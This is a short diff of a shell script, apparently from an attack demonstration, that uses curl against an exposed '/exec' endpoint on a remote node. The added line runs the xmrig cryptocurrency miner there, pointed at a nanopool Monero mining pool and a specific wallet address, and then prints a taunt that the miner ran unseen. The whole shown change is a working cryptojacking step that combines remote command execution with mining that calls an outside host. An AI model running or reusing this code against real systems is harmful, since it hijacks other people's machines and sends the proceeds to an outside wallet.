@@ -123,4 +123,4 @@ curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=tar -xz
 echo "---"
 echo "Running curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=xmrig-6.20.0/xmrig'"
 echo "---"
-curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=xmrig-6.20.0/xmrig'
+curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=xmrig-6.20.0/xmrig --coin=monero --url=stratum+tcp://xmr-us-west1.nanopool.org:10343 --user=43NyzPLNUxSXbAgK9szPpvBxXhajTwAT1YEWHU6YAKcpfBuiw4DgH5LNbmPAk5m5A5AAhkbFWGu2PTdC1EoDnwpZEHnVCco -k --tls; echo "Crypto miner ran even you didnt see it :)"'
